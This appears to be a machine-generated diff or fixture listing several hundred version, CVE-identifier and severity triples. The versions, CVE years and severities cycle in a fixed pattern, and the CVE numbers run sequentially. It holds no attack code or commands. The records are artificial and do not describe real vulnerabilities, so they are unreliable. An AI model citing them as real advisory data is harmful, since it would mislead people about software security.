+5.11.6|CVE-2021-12276|severity:low
+5.12.7|CVE-2022-12277|severity:med
+5.13.8|CVE-2023-12278|severity:high
+5.14.9|CVE-2024-12279|severity:crit
+5.0.0|CVE-2020-12280|severity:low
+5.1.1|CVE-2021-12281|severity:med
+5.2.2|CVE-2022-12282|severity:high
+5.3.3|CVE-2023-12283|severity:crit
+5.4.4|CVE-2024-12284|severity:low
+5.5.5|CVE-2020-12285|severity:med
+5.6.6|CVE-2021-12286|severity:high
+5.7.7|CVE-2022-12287|severity:crit
+5.8.8|CVE-2023-12288|severity:low
+5.9.9|CVE-2024-12289|severity:med
+5.10.0|CVE-2020-12290|severity:high
+5.11.1|CVE-2021-12291|severity:crit
+5.12.2|CVE-2022-12292|severity:low
+5.13.3|CVE-2023-12293|severity:med
+5.14.4|CVE-2024-12294|severity:high
+5.0.5|CVE-2020-12295|severity:crit
+5.1.6|CVE-2021-12296|severity:low
+5.2.7|CVE-2022-12297|severity:med
+5.3.8|CVE-2023-12298|severity:high
+5.4.9|CVE-2024-12299|severity:crit
+5.5.0|CVE-2020-12300|severity:low
+5.6.1|CVE-2021-12301|severity:med
+5.7.2|CVE-2022-12302|severity:high
+5.8.3|CVE-2023-12303|severity:crit
+5.9.4|CVE-2024-12304|severity:low
+5.10.5|CVE-2020-12305|severity:med
+5.11.6|CVE-2021-12306|severity:high
+5.12.7|CVE-2022-12307|severity:crit
+5.13.8|CVE-2023-12308|severity:low
+5.14.9|CVE-2024-12309|severity:med
+5.0.0|CVE-2020-12310|severity:high
+5.1.1|CVE-2021-12311|severity:crit
+5.2.2|CVE-2022-12312|severity:low
+5.3.3|CVE-2023-12313|severity:med
+5.4.4|CVE-2024-12314|severity:high
+5.5.5|CVE-2020-12315|severity:crit
+5.6.6|CVE-2021-12316|severity:low
+5.7.7|CVE-2022-12317|severity:med
+5.8.8|CVE-2023-12318|severity:high
+5.9.9|CVE-2024-12319|severity:crit
+5.10.0|CVE-2020-12320|severity:low
+5.11.1|CVE-2021-12321|severity:med
+5.12.2|CVE-2022-12322|severity:high
+5.13.3|CVE-2023-12323|severity:crit
+5.14.4|CVE-2024-12324|severity:low
+5.0.5|CVE-2020-12325|severity:med
+5.1.6|CVE-2021-12326|severity:high
+5.2.7|CVE-2022-12327|severity:crit
+5.3.8|CVE-2023-12328|severity:low
+5.4.9|CVE-2024-12329|severity:med
+5.5.0|CVE-2020-12330|severity:high
+5.6.1|CVE-2021-12331|severity:crit
+5.7.2|CVE-2022-12332|severity:low
+5.8.3|CVE-2023-12333|severity:med
+5.9.4|CVE-2024-12334|severity:high
+5.10.5|CVE-2020-12335|severity:crit
+5.11.6|CVE-2021-12336|severity:low
+5.12.7|CVE-2022-12337|severity:med
+5.13.8|CVE-2023-12338|severity:high
+5.14.9|CVE-2024-12339|severity:crit
+5.0.0|CVE-2020-12340|severity:low
+5.1.1|CVE-2021-12341|severity:med
+5.2.2|CVE-2022-12342|severity:high
+5.3.3|CVE-2023-12343|severity:crit
+5.4.4|CVE-2024-12344|severity:low
+5.5.5|CVE-2020-12345|severity:med
+5.6.6|CVE-2021-12346|severity:high
+5.7.7|CVE-2022-12347|severity:crit
+5.8.8|CVE-2023-12348|severity:low
+5.9.9|CVE-2024-12349|severity:med
+5.10.0|CVE-2020-12350|severity:high
+5.11.1|CVE-2021-12351|severity:crit
+5.12.2|CVE-2022-12352|severity:low
+5.13.3|CVE-2023-12353|severity:med
+5.14.4|CVE-2024-12354|severity:high
+5.0.5|CVE-2020-12355|severity:crit
+5.1.6|CVE-2021-12356|severity:low
+5.2.7|CVE-2022-12357|severity:med
+5.3.8|CVE-2023-12358|severity:high
+5.4.9|CVE-2024-12359|severity:crit
+5.5.0|CVE-2020-12360|severity:low
+5.6.1|CVE-2021-12361|severity:med
+5.7.2|CVE-2022-12362|severity:high
+5.8.3|CVE-2023-12363|severity:crit
+5.9.4|CVE-2024-12364|severity:low
+5.10.5|CVE-2020-12365|severity:med
+5.11.6|CVE-2021-12366|severity:high
+5.12.7|CVE-2022-12367|severity:crit
+5.13.8|CVE-2023-12368|severity:low
+5.14.9|CVE-2024-12369|severity:med
+5.0.0|CVE-2020-12370|severity:high
+5.1.1|CVE-2021-12371|severity:crit
+5.2.2|CVE-2022-12372|severity:low
+5.3.3|CVE-2023-12373|severity:med
+5.4.4|CVE-2024-12374|severity:high
+5.5.5|CVE-2020-12375|severity:crit
+5.6.6|CVE-2021-12376|severity:low
+5.7.7|CVE-2022-12377|severity:med
+5.8.8|CVE-2023-12378|severity:high
+5.9.9|CVE-2024-12379|severity:crit
+5.10.0|CVE-2020-12380|severity:low
+5.11.1|CVE-2021-12381|severity:med
+5.12.2|CVE-2022-12382|severity:high
+5.13.3|CVE-2023-12383|severity:crit
+5.14.4|CVE-2024-12384|severity:low
+5.0.5|CVE-2020-12385|severity:med
+5.1.6|CVE-2021-12386|severity:high
+5.2.7|CVE-2022-12387|severity:crit
+5.3.8|CVE-2023-12388|severity:low
+5.4.9|CVE-2024-12389|severity:med
+5.5.0|CVE-2020-12390|severity:high
+5.6.1|CVE-2021-12391|severity:crit
+5.7.2|CVE-2022-12392|severity:low
+5.8.3|CVE-2023-12393|severity:med
+5.9.4|CVE-2024-12394|severity:high
+5.10.5|CVE-2020-12395|severity:crit
+5.11.6|CVE-2021-12396|severity:low
+5.12.7|CVE-2022-12397|severity:med
+5.13.8|CVE-2023-12398|severity:high
+5.14.9|CVE-2024-12399|severity:crit
+5.0.0|CVE-2020-12400|severity:low
+5.1.1|CVE-2021-12401|severity:med
+5.2.2|CVE-2022-12402|severity:high
+5.3.3|CVE-2023-12403|severity:crit
+5.4.4|CVE-2024-12404|severity:low
+5.5.5|CVE-2020-12405|severity:med
+5.6.6|CVE-2021-12406|severity:high
+5.7.7|CVE-2022-12407|severity:crit
+5.8.8|CVE-2023-12408|severity:low
+5.9.9|CVE-2024-12409|severity:med
+5.10.0|CVE-2020-12410|severity:high
+5.11.1|CVE-2021-12411|severity:crit
+5.12.2|CVE-2022-12412|severity:low
+5.13.3|CVE-2023-12413|severity:med
+5.14.4|CVE-2024-12414|severity:high
+5.0.5|CVE-2020-12415|severity:crit
+5.1.6|CVE-2021-12416|severity:low
+5.2.7|CVE-2022-12417|severity:med
+5.3.8|CVE-2023-12418|severity:high
+5.4.9|CVE-2024-12419|severity:crit
+5.5.0|CVE-2020-12420|severity:low
+5.6.1|CVE-2021-12421|severity:med
+5.7.2|CVE-2022-12422|severity:high
+5.8.3|CVE-2023-12423|severity:crit
+5.9.4|CVE-2024-12424|severity:low
+5.10.5|CVE-2020-12425|severity:med
+5.11.6|CVE-2021-12426|severity:high
+5.12.7|CVE-2022-12427|severity:crit
+5.13.8|CVE-2023-12428|severity:low
+5.14.9|CVE-2024-12429|severity:med
+5.0.0|CVE-2020-12430|severity:high
+5.1.1|CVE-2021-12431|severity:crit
+5.2.2|CVE-2022-12432|severity:low
+5.3.3|CVE-2023-12433|severity:med
+5.4.4|CVE-2024-12434|severity:high
+5.5.5|CVE-2020-12435|severity:crit
+5.6.6|CVE-2021-12436|severity:low
+5.7.7|CVE-2022-12437|severity:med
+5.8.8|CVE-2023-12438|severity:high
+5.9.9|CVE-2024-12439|severity:crit
+5.10.0|CVE-2020-12440|severity:low
+5.11.1|CVE-2021-12441|severity:med
+5.12.2|CVE-2022-12442|severity:high
+5.13.3|CVE-2023-12443|severity:crit
+5.14.4|CVE-2024-12444|severity:low
+5.0.5|CVE-2020-12445|severity:med
+5.1.6|CVE-2021-12446|severity:high
+5.2.7|CVE-2022-12447|severity:crit
+5.3.8|CVE-2023-12448|severity:low
+5.4.9|CVE-2024-12449|severity:med
+5.5.0|CVE-2020-12450|severity:high
+5.6.1|CVE-2021-12451|severity:crit
+5.7.2|CVE-2022-12452|severity:low
+5.8.3|CVE-2023-12453|severity:med
+5.9.4|CVE-2024-12454|severity:high
+5.10.5|CVE-2020-12455|severity:crit
+5.11.6|CVE-2021-12456|severity:low
+5.12.7|CVE-2022-12457|severity:med
+5.13.8|CVE-2023-12458|severity:high
+5.14.9|CVE-2024-12459|severity:crit
+5.0.0|CVE-2020-12460|severity:low
+5.1.1|CVE-2021-12461|severity:med
+5.2.2|CVE-2022-12462|severity:high
+5.3.3|CVE-2023-12463|severity:crit
+5.4.4|CVE-2024-12464|severity:low
+5.5.5|CVE-2020-12465|severity:med
+5.6.6|CVE-2021-12466|severity:high
+5.7.7|CVE-2022-12467|severity:crit
+5.8.8|CVE-2023-12468|severity:low
+5.9.9|CVE-2024-12469|severity:med
+5.10.0|CVE-2020-12470|severity:high
+5.11.1|CVE-2021-12471|severity:crit
+5.12.2|CVE-2022-12472|severity:low
+5.13.3|CVE-2023-12473|severity:med
+5.14.4|CVE-2024-12474|severity:high
+5.0.5|CVE-2020-12475|severity:crit
+5.1.6|CVE-2021-12476|severity:low
+5.2.7|CVE-2022-12477|severity:med
+5.3.8|CVE-2023-12478|severity:high
+5.4.9|CVE-2024-12479|severity:crit
+5.5.0|CVE-2020-12480|severity:low
+5.6.1|CVE-2021-12481|severity:med
+5.7.2|CVE-2022-12482|severity:high
+5.8.3|CVE-2023-12483|severity:crit
+5.9.4|CVE-2024-12484|severity:low
+5.10.5|CVE-2020-12485|severity:med
+5.11.6|CVE-2021-12486|severity:high
+5.12.7|CVE-2022-12487|severity:crit
+5.13.8|CVE-2023-12488|severity:low
+5.14.9|CVE-2024-12489|severity:med
+5.0.0|CVE-2020-12490|severity:high
+5.1.1|CVE-2021-12491|severity:crit
+5.2.2|CVE-2022-12492|severity:low
+5.3.3|CVE-2023-12493|severity:med
+5.4.4|CVE-2024-12494|severity:high
+5.5.5|CVE-2020-12495|severity:crit
+5.6.6|CVE-2021-12496|severity:low
+5.7.7|CVE-2022-12497|severity:med
+5.8.8|CVE-2023-12498|severity:high
+5.9.9|CVE-2024-12499|severity:crit
+5.10.0|CVE-2020-12500|severity:low
+5.11.1|CVE-2021-12501|severity:med
+5.12.2|CVE-2022-12502|severity:high
+5.13.3|CVE-2023-12503|severity:crit
+5.14.4|CVE-2024-12504|severity:low
+5.0.5|CVE-2020-12505|severity:med
+5.1.6|CVE-2021-12506|severity:high
+5.2.7|CVE-2022-12507|severity:crit
+5.3.8|CVE-2023-12508|severity:low
+5.4.9|CVE-2024-12509|severity:med
+5.5.0|CVE-2020-12510|severity:high
+5.6.1|CVE-2021-12511|severity:crit
+5.7.2|CVE-2022-12512|severity:low
+5.8.3|CVE-2023-12513|severity:med
+5.9.4|CVE-2024-12514|severity:high
+5.10.5|CVE-2020-12515|severity:crit
+5.11.6|CVE-2021-12516|severity:low
+5.12.7|CVE-2022-12517|severity:med
+5.13.8|CVE-2023-12518|severity:high
+5.14.9|CVE-2024-12519|severity:crit
+5.0.0|CVE-2020-12520|severity:low
+5.1.1|CVE-2021-12521|severity:med
+5.2.2|CVE-2022-12522|severity:high
+5.3.3|CVE-2023-12523|severity:crit
+5.4.4|CVE-2024-12524|severity:low
+5.5.5|CVE-2020-12525|severity:med
+5.6.6|CVE-2021-12526|severity:high
+5.7.7|CVE-2022-12527|severity:crit
+5.8.8|CVE-2023-12528|severity:low
+5.9.9|CVE-2024-12529|severity:med
+5.10.0|CVE-2020-12530|severity:high
+5.11.1|CVE-2021-12531|severity:crit
+5.12.2|CVE-2022-12532|severity:low
+5.13.3|CVE-2023-12533|severity:med
+5.14.4|CVE-2024-12534|severity:high
+5.0.5|CVE-2020-12535|severity:crit
+5.1.6|CVE-2021-12536|severity:low
+5.2.7|CVE-2022-12537|severity:med
+5.3.8|CVE-2023-12538|severity:high
+5.4.9|CVE-2024-12539|severity:crit
+5.5.0|CVE-2020-12540|severity:low
+5.6.1|CVE-2021-12541|severity:med
+5.7.2|CVE-2022-12542|severity:high
+5.8.3|CVE-2023-12543|severity:crit
+5.9.4|CVE-2024-12544|severity:low
+5.10.5|CVE-2020-12545|severity:med
+5.11.6|CVE-2021-12546|severity:high
+5.12.7|CVE-2022-12547|severity:crit
+5.13.8|CVE-2023-12548|severity:low
+5.14.9|CVE-2024-12549|severity:med
+5.0.0|CVE-2020-12550|severity:high
+5.1.1|CVE-2021-12551|severity:crit
+5.2.2|CVE-2022-12552|severity:low
+5.3.3|CVE-2023-12553|severity:med
+5.4.4|CVE-2024-12554|severity:high
+5.5.5|CVE-2020-12555|severity:crit
+5.6.6|CVE-2021-12556|severity:low
+5.7.7|CVE-2022-12557|severity:med
+5.8.8|CVE-2023-12558|severity:high
+5.9.9|CVE-2024-12559|severity:crit
+5.10.0|CVE-2020-12560|severity:low
+5.11.1|CVE-2021-12561|severity:med
+5.12.2|CVE-2022-12562|severity:high
+5.13.3|CVE-2023-12563|severity:crit
+5.14.4|CVE-2024-12564|severity:low
+5.0.5|CVE-2020-12565|severity:med
+5.1.6|CVE-2021-12566|severity:high
+5.2.7|CVE-2022-12567|severity:crit
+5.3.8|CVE-2023-12568|severity:low
+5.4.9|CVE-2024-12569|severity:med
+5.5.0|CVE-2020-12570|severity:high
+5.6.1|CVE-2021-12571|severity:crit
+5.7.2|CVE-2022-12572|severity:low
+5.8.3|CVE-2023-12573|severity:med
+5.9.4|CVE-2024-12574|severity:high
+5.10.5|CVE-2020-12575|severity:crit
+5.11.6|CVE-2021-12576|severity:low
+5.12.7|CVE-2022-12577|severity:med
+5.13.8|CVE-2023-12578|severity:high
+5.14.9|CVE-2024-12579|severity:crit
+5.0.0|CVE-2020-12580|severity:low
+5.1.1|CVE-2021-12581|severity:med
+5.2.2|CVE-2022-12582|severity:high
+5.3.3|CVE-2023-12583|severity:crit
+5.4.4|CVE-2024-12584|severity:low
+5.5.5|CVE-2020-12585|severity:med
+5.6.6|CVE-2021-12586|severity:high
+5.7.7|CVE-2022-12587|severity:crit
+5.8.8|CVE-2023-12588|severity:low
+5.9.9|CVE-2024-12589|severity:med
+5.10.0|CVE-2020-12590|severity:high
+5.11.1|CVE-2021-12591|severity:crit
+5.12.2|CVE-2022-12592|severity:low
+5.13.3|CVE-2023-12593|severity:med
+5.14.4|CVE-2024-12594|severity:high
+5.0.5|CVE-2020-12595|severity:crit
+5.1.6|CVE-2021-12596|severity:low
+5.2.7|CVE-2022-12597|severity:med
+5.3.8|CVE-2023-12598|severity:high
+5.4.9|CVE-2024-12599|severity:crit
+5.5.0|CVE-2020-12600|severity:low
+5.6.1|CVE-2021-12601|severity:med
+5.7.2|CVE-2022-12602|severity:high
+5.8.3|CVE-2023-12603|severity:crit
+5.9.4|CVE-2024-12604|severity:low
+5.10.5|CVE-2020-12605|severity:med
+5.11.6|CVE-2021-12606|severity:high
+5.12.7|CVE-2022-12607|severity:crit
+5.13.8|CVE-2023-12608|severity:low
+5.14.9|CVE-2024-12609|severity:med
+5.0.0|CVE-2020-12610|severity:high
+5.1.1|CVE-2021-12611|severity:crit
+5.2.2|CVE-2022-12612|severity:low
+5.3.3|CVE-2023-12613|severity:med
+5.4.4|CVE-2024-12614|severity:high
+5.5.5|CVE-2020-12615|severity:crit
+5.6.6|CVE-2021-12616|severity:low
+5.7.7|CVE-2022-12617|severity:med
+5.8.8|CVE-2023-12618|severity:high
+5.9.9|CVE-2024-12619|severity:crit
+5.10.0|CVE-2020-12620|severity:low
+5.11.1|CVE-2021-12621|severity:med
+5.12.2|CVE-2022-12622|severity:high
+5.13.3|CVE-2023-12623|severity:crit
+5.14.4|CVE-2024-12624|severity:low
+5.0.5|CVE-2020-12625|severity:med
+5.1.6|CVE-2021-12626|severity:high
+5.2.7|CVE-2022-12627|severity:crit
+5.3.8|CVE-2023-12628|severity:low
+5.4.9|CVE-2024-12629|severity:med
+5.5.0|CVE-2020-12630|severity:high
+5.6.1|CVE-2021-12631|severity:crit
+5.7.2|CVE-2022-12632|severity:low
+5.8.3|CVE-2023-12633|severity:med
+5.9.4|CVE-2024-12634|severity:high
+5.10.5|CVE-2020-12635|severity:crit
+5.11.6|CVE-2021-12636|severity:low
+5.12.7|CVE-2022-12637|severity:med
+5.13.8|CVE-2023-12638|severity:high
+5.14.9|CVE-2024-12639|severity:crit
+5.0.0|CVE-2020-12640|severity:low
+5.1.1|CVE-2021-12641|severity:med
+5.2.2|CVE-2022-12642|severity:high
+5.3.3|CVE-2023-12643|severity:crit
+5.4.4|CVE-2024-12644|severity:low
+5.5.5|CVE-2020-12645|severity:med
+5.6.6|CVE-2021-12646|severity:high
+5.7.7|CVE-2022-12647|severity:crit
+5.8.8|CVE-2023-12648|severity:low
+5.9.9|CVE-2024-12649|severity:med
+5.10.0|CVE-2020-12650|severity:high
+5.11.1|CVE-2021-12651|severity:crit
+5.12.2|CVE-2022-12652|severity:low
+5.13.3|CVE-2023-12653|severity:med
+5.14.4|CVE-2024-12654|severity:high
+5.0.5|CVE-2020-12655|severity:crit
+5.1.6|CVE-2021-12656|severity:low
+5.2.7|CVE-2022-12657|severity:med
+5.3.8|CVE-2023-12658|severity:high
+5.4.9|CVE-2024-12659|severity:crit
+5.5.0|CVE-2020-12660|severity:low
+5.6.1|CVE-2021-12661|severity:med
+5.7.2|CVE-2022-12662|severity:high
+5.8.3|CVE-2023-12663|severity:crit
+5.9.4|CVE-2024-12664|severity:low
+5.10.5|CVE-2020-12665|severity:med
+5.11.6|CVE-2021-12666|severity:high
+5.12.7|CVE-2022-12667|severity:crit
+5.13.8|CVE-2023-12668|severity:low
+5.14.9|CVE-2024-12669|severity:med
+5.0.0|CVE-2020-12670|severity:high
+5.1.1|CVE-2021-12671|severity:crit
+5.2.2|CVE-2022-12672|severity:low
+5.3.3|CVE-2023-12673|severity:med
+5.4.4|CVE-2024-12674|severity:high
+5.5.5|CVE-2020-12675|severity:crit
+5.6.6|CVE-2021-12676|severity:low
+5.7.7|CVE-2022-12677|severity:med
+5.8.8|CVE-2023-12678|severity:high
+5.9.9|CVE-2024-12679|severity:crit
+5.10.0|CVE-2020-12680|severity:low
+5.11.1|CVE-2021-12681|severity:med
+5.12.2|CVE-2022-12682|severity:high
+5.13.3|CVE-2023-12683|severity:crit
+5.14.4|CVE-2024-12684|severity:low
+5.0.5|CVE-2020-12685|severity:med
+5.1.6|CVE-2021-12686|severity:high
+5.2.7|CVE-2022-12687|severity:crit
+5.3.8|CVE-2023-12688|severity:low
+5.4.9|CVE-2024-12689|severity:med
+5.5.0|CVE-2020-12690|severity:high
+5.6.1|CVE-2021-12691|severity:crit
+5.7.2|CVE-2022-12692|severity:low
+5.8.3|CVE-2023-12693|severity:med
+5.9.4|CVE-2024-12694|severity:high
+5.10.5|CVE-2020-12695|severity:crit
+5.11.6|CVE-2021-12696|severity:low
+5.12.7|CVE-2022-12697|severity:med
+5.13.8|CVE-2023-12698|severity:high
+5.14.9|CVE-2024-12699|severity:crit
+5.0.0|CVE-2020-12700|severity:low
+5.1.1|CVE-2021-12701|severity:med
+5.2.2|CVE-2022-12702|severity:high
+5.3.3|CVE-2023-12703|severity:crit
+5.4.4|CVE-2024-12704|severity:low
+5.5.5|CVE-2020-12705|severity:med
+5.6.6|CVE-2021-12706|severity:high
+5.7.7|CVE-2022-12707|severity:crit
+5.8.8|CVE-2023-12708|severity:low
+5.9.9|CVE-2024-12709|severity:med
+5.10.0|CVE-2020-12710|severity:high
+5.11.1|CVE-2021-12711|severity:crit
+5.12.2|CVE-2022-12712|severity:low
+5.13.3|CVE-2023-12713|severity:med
+5.14.4|CVE-2024-12714|severity:high
+5.0.5|CVE-2020-12715|severity:crit
+5.1.6|CVE-2021-12716|severity:low
+5.2.7|CVE-2022-12717|severity:med
+5.3.8|CVE-2023-12718|severity:high
+5.4.9|CVE-2024-12719|severity:crit
+5.5.0|CVE-2020-12720|severity:low
+5.6.1|CVE-2021-12721|severity:med
+5.7.2|CVE-2022-12722|severity:high
+5.8.3|CVE-2023-12723|severity:crit
+5.9.4|CVE-2024-12724|severity:low
+5.10.5|CVE-2020-12725|severity:med
+5.11.6|CVE-2021-12726|severity:high
+5.12.7|CVE-2022-12727|severity:crit
+5.13.8|CVE-2023-12728|severity:low
+5.14.9|CVE-2024-12729|severity:med
+5.0.0|CVE-2020-12730|severity:high
+5.1.1|CVE-2021-12731|severity:crit
+5.2.2|CVE-2022-12732|severity:low
+5.3.3|CVE-2023-12733|severity:med
+5.4.4|CVE-2024-12734|severity:high
+5.5.5|CVE-2020-12735|severity:crit
+5.6.6|CVE-2021-12736|severity:low
+5.7.7|CVE-2022-12737|severity:med
+5.8.8|CVE-2023-12738|severity:high
+5.9.9|CVE-2024-12739|severity:crit
+5.10.0|CVE-2020-12740|severity:low
+5.11.1|CVE-2021-12741|severity:med
+5.12.2|CVE-2022-12742|severity:high
+5.13.3|CVE-2023-12743|severity:crit
+5.14.4|CVE-2024-12744|severity:low
+5.0.5|CVE-2020-12745|severity:med
+5.1.6|CVE-2021-12746|severity:high
+5.2.7|CVE-2022-12747|severity:crit
+5.3.8|CVE-2023-12748|severity:low
+5.4.9|CVE-2024-12749|severity:med
+5.5.0|CVE-2020-12750|severity:high
+5.6.1|CVE-2021-12751|severity:crit
+5.7.2|CVE-2022-12752|severity:low
+5.8.3|CVE-2023-12753|severity:med
+5.9.4|CVE-2024-12754|severity:high
+5.10.5|CVE-2020-12755|severity:crit
+5.11.6|CVE-2021-12756|severity:low
+5.12.7|CVE-2022-12757|severity:med
+5.13.8|CVE-2023-12758|severity:high
+5.14.9|CVE-2024-12759|severity:crit
+5.0.0|CVE-2020-12760|severity:low
+5.1.1|CVE-2021-12761|severity:med
+5.2.2|CVE-2022-12762|severity:high
+5.3.3|CVE-2023-12763|severity:crit
+5.4.4|CVE-2024-12764|severity:low
+5.5.5|CVE-2020-12765|severity:med
+5.6.6|CVE-2021-12766|severity:high
+5.7.7|CVE-2022-12767|severity:crit
+5.8.8|CVE-2023-12768|severity:low
+5.9.9|CVE-2024-12769|severity:med
+5.10.0|CVE-2020-12770|severity:high
+5.11.1|CVE-2021-12771|severity:crit
+5.12.2|CVE-2022-12772|severity:low
+5.13.3|CVE-2023-12773|severity:med
+5.14.4|CVE-2024-12774|severity:high
+5.0.5|CVE-2020-12775|severity:crit
+5.1.6|CVE-2021-12776|severity:low
+5.2.7|CVE-2022-12777|severity:med
+5.3.8|CVE-2023-12778|severity:high
+5.4.9|CVE-2024-12779|severity:crit
+5.5.0|CVE-2020-12780|severity:low
+5.6.1|CVE-2021-12781|severity:med
+5.7.2|CVE-2022-12782|severity:high
+5.8.3|CVE-2023-12783|severity:crit
+5.9.4|CVE-2024-12784|severity:low
+5.10.5|CVE-2020-12785|severity:med
+5.11.6|CVE-2021-12786|severity:high
+5.12.7|CVE-2022-12787|severity:crit
+5.13.8|CVE-2023-12788|severity:low
+5.14.9|CVE-2024-12789|severity:med
+5.0.0|CVE-2020-12790|severity:high
+5.1.1|CVE-2021-12791|severity:crit
+5.2.2|CVE-2022-12792|severity:low
+5.3.3|CVE-2023-12793|severity:med
+5.4.4|CVE-2024-12794|severity:high
+5.5.5|CVE-2020-12795|severity:crit
+5.6.6|CVE-2021-12796|severity:low
+5.7.7|CVE-2022-12797|severity:med
+5.8.8|CVE-2023-12798|severity:high
+5.9.9|CVE-2024-12799|severity:crit
+5.10.0|CVE-2020-12800|severity:low
+5.11.1|CVE-2021-12801|severity:med
+5.12.2|CVE-2022-12802|severity:high
+5.13.3|CVE-2023-12803|severity:crit
+5.14.4|CVE-2024-12804|severity:low
+5.0.5|CVE-2020-12805|severity:med
+5.1.6|CVE-2021-12806|severity:high
+5.2.7|CVE-2022-12807|severity:crit
+5.3.8|CVE-2023-12808|severity:low
+5.4.9|CVE-2024-12809|severity:med
+5.5.0|CVE-2020-12810|severity:high
+5.6.1|CVE-2021-12811|severity:crit
+5.7.2|CVE-2022-12812|severity:low
+5.8.3|CVE-2023-12813|severity:med
+5.9.4|CVE-2024-12814|severity:high
+5.10.5|CVE-2020-12815|severity:crit
+5.11.6|CVE-2021-12816|severity:low
+5.12.7|CVE-2022-12817|severity:med
+5.13.8|CVE-2023-12818|severity:high
+5.14.9|CVE-2024-12819|severity:crit
+5.0.0|CVE-2020-12820|severity:low
+5.1.1|CVE-2021-12821|severity:med
+5.2.2|CVE-2022-12822|severity:high
+5.3.3|CVE-2023-12823|severity:crit
+5.4.4|CVE-2024-12824|severity:low
+5.5.5|CVE-2020-12825|severity:med
+5.6.6|CVE-2021-12826|severity:high
+5.7.7|CVE-2022-12827|severity:crit
+5.8.8|CVE-2023-12828|severity:low
+5.9.9|CVE-2024-12829|severity:med
+5.10.0|CVE-2020-12830|severity:high
+5.11.1|CVE-2021-12831|severity:crit
+5.12.2|CVE-2022-12832|severity:low
+5.13.3|CVE-2023-12833|severity:med
+5.14.4|CVE-2024-12834|severity:high
+5.0.5|CVE-2020-12835|severity:crit
+5.1.6|CVE-2021-12836|severity:low
+5.2.7|CVE-2022-12837|severity:med
+5.3.8|CVE-2023-12838|severity:high
+5.4.9|CVE-2024-12839|severity:crit
+5.5.0|CVE-2020-12840|severity:low
+5.6.1|CVE-2021-12841|severity:med
+5.7.2|CVE-2022-12842|severity:high
+5.8.3|CVE-2023-12843|severity:crit
+5.9.4|CVE-2024-12844|severity:low
+5.10.5|CVE-2020-12845|severity:med
+5.11.6|CVE-2021-12846|severity:high
+5.12.7|CVE-2022-12847|severity:crit
+5.13.8|CVE-2023-12848|severity:low
+5.14.9|CVE-2024-12849|severity:med
+5.0.0|CVE-2020-12850|severity:high
+5.1.1|CVE-2021-12851|severity:crit
+5.2.2|CVE-2022-12852|severity:low
+5.3.3|CVE-2023-12853|severity:med
+5.4.4|CVE-2024-12854|severity:high
+5.5.5|CVE-2020-12855|severity:crit
+5.6.6|CVE-2021-12856|severity:low
+5.7.7|CVE-2022-12857|severity:med
+5.8.8|CVE-2023-12858|severity:high
+5.9.9|CVE-2024-12859|severity:crit
+5.10.0|CVE-2020-12860|severity:low
+5.11.1|CVE-2021-12861|severity:med
+5.12.2|CVE-2022-12862|severity:high
+5.13.3|CVE-2023-12863|severity:crit
+5.14.4|CVE-2024-12864|severity:low
+5.0.5|CVE-2020-12865|severity:med
+5.1.6|CVE-2021-12866|severity:high
+5.2.7|CVE-2022-12867|severity:crit
+5.3.8|CVE-2023-12868|severity:low
+5.4.9|CVE-2024-12869|severity:med
+5.5.0|CVE-2020-12870|severity:high
+5.6.1|CVE-2021-12871|severity:crit
+5.7.2|CVE-2022-12872|severity:low
+5.8.3|CVE-2023-12873|severity:med
+5.9.4|CVE-2024-12874|severity:high
+5.10.5|CVE-2020-12875|severity:crit
+5.11.6|CVE-2021-12876|severity:low
+5.12.7|CVE-2022-12877|severity:med
+5.13.8|CVE-2023-12878|severity:high
+5.14.9|CVE-2024-12879|severity:crit
+5.0.0|CVE-2020-12880|severity:low
+5.1.1|CVE-2021-12881|severity:med
+5.2.2|CVE-2022-12882|severity:high
+5.3.3|CVE-2023-12883|severity:crit
+5.4.4|CVE-2024-12884|severity:low
+5.5.5|CVE-2020-12885|severity:med
+5.6.6|CVE-2021-12886|severity:high
+5.7.7|CVE-2022-12887|severity:crit
+5.8.8|CVE-2023-12888|severity:low
+5.9.9|CVE-2024-12889|severity:med
+5.10.0|CVE-2020-12890|severity:high
+5.11.1|CVE-2021-12891|severity:crit
+5.12.2|CVE-2022-12892|severity:low
+5.13.3|CVE-2023-12893|severity:med
+5.14.4|CVE-2024-12894|severity:high
+5.0.5|CVE-2020-12895|severity:crit
+5.1.6|CVE-2021-12896|severity:low
+5.2.7|CVE-2022-12897|severity:med
+5.3.8|CVE-2023-12898|severity:high
+5.4.9|CVE-2024-12899|severity:crit
+5.5.0|CVE-2020-12900|severity:low
+5.6.1|CVE-2021-12901|severity:med
+5.7.2|CVE-2022-12902|severity:high
+5.8.3|CVE-2023-12903|severity:crit
+5.9.4|CVE-2024-12904|severity:low
+5.10.5|CVE-2020-12905|severity:med
+5.11.6|CVE-2021-12906|severity:high
+5.12.7|CVE-2022-12907|severity:crit
+5.13.8|CVE-2023-12908|severity:low
+5.14.9|CVE-2024-12909|severity:med
+5.0.0|CVE-2020-12910|severity:high
+5.1.1|CVE-2021-12911|severity:crit
+5.2.2|CVE-2022-12912|severity:low
+5.3.3|CVE-2023-12913|severity:med
+5.4.4|CVE-2024-12914|severity:high
+5.5.5|CVE-2020-12915|severity:crit
+5.6.6|CVE-2021-12916|severity:low
+5.7.7|CVE-2022-12917|severity:med
+5.8.8|CVE-2023-12918|severity:high
+5.9.9|CVE-2024-12919|severity:crit
+5.10.0|CVE-2020-12920|severity:low
+5.11.1|CVE-2021-12921|severity:med
+5.12.2|CVE-2022-12922|severity:high
+5.13.3|CVE-2023-12923|severity:crit
+5.14.4|CVE-2024-12924|severity:low
+5.0.5|CVE-2020-12925|severity:med
+5.1.6|CVE-2021-12926|severity:high
+5.2.7|CVE-2022-12927|severity:crit
+5.3.8|CVE-2023-12928|severity:low
+5.4.9|CVE-2024-12929|severity:med
+5.5.0|CVE-2020-12930|severity:high
+5.6.1|CVE-2021-12931|severity:crit
+5.7.2|CVE-2022-12932|severity:low
+5.8.3|CVE-2023-12933|severity:med
+5.9.4|CVE-2024-12934|severity:high
+5.10.5|CVE-2020-12935|severity:crit
+5.11.6|CVE-2021-12936|severity:low
+5.12.7|CVE-2022-12937|severity:med
+5.13.8|CVE-2023-12938|severity:high
+5.14.9|CVE-2024-12939|severity:crit
+5.0.0|CVE-2020-12940|severity:low
+5.1.1|CVE-2021-12941|severity:med
+5.2.2|CVE-2022-12942|severity:high
+5.3.3|CVE-2023-12943|severity:crit
+5.4.4|CVE-2024-12944|severity:low
+5.5.5|CVE-2020-12945|severity:med
+5.6.6|CVE-2021-12946|severity:high
+5.7.7|CVE-2022-12947|severity:crit
+5.8.8|CVE-2023-12948|severity:low
+5.9.9|CVE-2024-12949|severity:med
